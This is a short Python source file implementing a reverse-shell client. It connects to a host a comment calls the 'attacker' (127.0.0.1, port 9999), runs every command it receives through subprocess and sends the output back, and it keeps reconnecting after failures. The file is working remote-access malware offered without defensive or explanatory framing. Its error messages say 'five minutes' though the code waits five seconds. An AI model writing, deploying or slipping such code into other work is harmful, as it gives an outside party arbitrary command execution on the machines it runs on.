# -*- coding: utf-8 -*-
import socket, subprocess, sys, time

while True:
    try:
        # create socket
        s = socket.socket()
        
        # connect to attacker
        s.connect(("127.0.0.1", 9999))

        # incoming data buffer
        message = s.recv(1024).decode()
        
        # verbose output
        print("[+] Server: ", message)

        while True:
            # get command
            command = s.recv(1024).decode()
            
            #verbose output
            print("[+] Server: ", command)
            
            if not command:
                # data anomaly / closed connection
                break
            if command.lower() == "goodbye":
                # terminate connection
                break
                
            # send command output
            output = subprocess.getoutput(command)
            if output == "":
                output = "<null>"
        
            s.send(output.encode())

        s.close()
    except ConnectionRefusedError:
        print('[!] Destination unreachable! Reviving connection in 5 minutes')
        time.sleep(5)
    except Exception as e:
        print(e)
        print('\r\n[!] Critical error! Reviving connection in 5 minutes')
        time.sleep(5)

sys.exit()
